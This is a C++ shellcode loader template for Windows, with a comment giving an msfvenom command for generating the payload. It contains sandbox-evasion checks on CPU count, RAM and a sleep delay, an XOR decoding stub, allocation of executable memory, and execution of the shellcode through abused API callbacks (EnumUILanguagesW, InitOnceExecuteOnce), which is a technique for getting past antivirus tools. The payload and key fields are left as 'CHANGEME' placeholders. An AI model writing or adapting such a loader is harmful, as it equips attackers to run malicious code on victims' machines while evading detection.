#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f raw -i 5 -e cmd/powershell_base64 -o file.bin
// use https://github.com/AchocolatechipPancake/encode_payload 
// input the python script output

BOOL CheckSandbox() {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    if (systemInfo.dwNumberOfProcessors < 2)
        return TRUE;
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMsize = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMsize < 2048)
        return TRUE;
    Sleep(5000);
    return FALSE;
}


int main() {
    
    // Encrypted shellcode and cipher key obtained from encode_payload vbbbbbbbbbbbbbbbbbbbbbbbbb
    bool c = CheckSandbox();
    if (c == TRUE)
        return 0;
    char encryptedShellcode[] = "CHANGEME";
    char key[] = "CHANGEME";
    char cipherType[] = "CHANGEME";

    // Char array to host the deciphered shellcode
    char shellcode[sizeof encryptedShellcode];


    // XOR decoding stub using the key defined above must be the same as the encoding key
    int j = 0;
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        if (j == sizeof key - 1) j = 0;

        shellcode[i] = encryptedShellcode[i] ^ key[j];
        j++;
    }
    try {

        //BOOL EnumUILanguagesW(
        //    [in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,
        //    [in] DWORD                dwFlags,
        //    [in] LONG_PTR             lParam
        //    );
        
        // [in] lpUILanguageEnumProc
        // Pointer to an application - defined EnumUILanguagesProc callback function.EnumUILanguages calls this function repeatedly to enumerate the languages in the list.

        
        LPVOID address = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(address, &shellcode[0], sizeof(shellcode));

        ::EnumUILanguagesW((UILANGUAGE_ENUMPROCW)address, MUI_LANGUAGE_ID, NULL);
        return 0;
    }
    catch(...) {

        HANDLE hProcess = ::GetCurrentProcess();

        LPVOID address = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(address, &shellcode[0], sizeof(shellcode));

        PVOID lpContext;
        BOOL  bStatus;

        INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;


        //BOOL InitOnceExecuteOnce(
        //    [in, out]           PINIT_ONCE    InitOnce,
        //    [in]                PINIT_ONCE_FN InitFn,
        //    [in, optional]      PVOID         Parameter,
        //    [in, out, optional] LPVOID* Context
        //    );

        // [in] InitFn
        // A pointer to an application - defined InitOnceCallback function.

        ::InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)address, NULL, &lpContext);


    }
}
